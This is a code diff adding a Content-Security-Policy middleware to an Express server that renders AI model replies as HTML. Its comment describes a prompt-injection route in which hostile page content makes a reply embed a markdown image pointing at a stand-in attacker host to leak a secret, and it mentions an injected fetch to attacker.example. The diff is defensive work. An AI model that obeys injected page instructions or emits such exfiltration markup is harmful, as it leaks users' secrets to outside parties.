@@ -166,6 +166,47 @@ async function identityReason(req: IncomingMessage): Promise<string | null> {
 const app = express();
 
 /**
+ * Content-Security-Policy on every response.
+ *
+ * The transcript renders model replies as HTML, and model replies are shaped by
+ * untrusted page content, so a hostile page can smuggle an instruction that
+ * makes a reply embed `![x](http://attacker/px?d=<secret>)`. DOMPurify strips
+ * scripts and event handlers, so injected markup cannot run code — it can only
+ * auto-load a subresource. Locking img/media/font/connect to our own origin
+ * closes that exfiltration channel: an off-origin pixel simply never fires.
+ *
+ *   img/media  'self' data: blob:  — same-origin assets, inline data URIs, and
+ *                                    the blob: URLs the file viewer builds
+ *   connect    'self'              — the /ws and /pty sockets are same-origin;
+ *                                    an injected fetch to attacker.example dies
+ *   script     'unsafe-inline'     — the pages carry one inline bootstrap each;
+ *                                    every real dependency is a same-origin
+ *                                    /vendor file, so this only permits our own
+ *                                    inline block, not injected script (which
+ *                                    DOMPurify already removes)
+ */
+const CSP = [
+  "default-src 'self'",
+  "script-src 'self' 'unsafe-inline'",
+  "style-src 'self' 'unsafe-inline'",
+  "img-src 'self' data: blob:",
+  "media-src 'self' data: blob:",
+  "font-src 'self' data:",
+  "connect-src 'self'",
+  "object-src 'none'",
+  "frame-src 'none'",
+  "base-uri 'none'",
+  "form-action 'self'",
+].join("; ");
+
+app.use((_req, res, next) => {
+  res.setHeader("Content-Security-Policy", CSP);
+  res.setHeader("X-Content-Type-Options", "nosniff");
+  res.setHeader("Referrer-Policy", "no-referrer");
+  next();
+});
+
+/**
  * Same two checks as a WebSocket upgrade. Static assets stay open — they are
  * inert without a session — but anything touching the filesystem does not.
  */
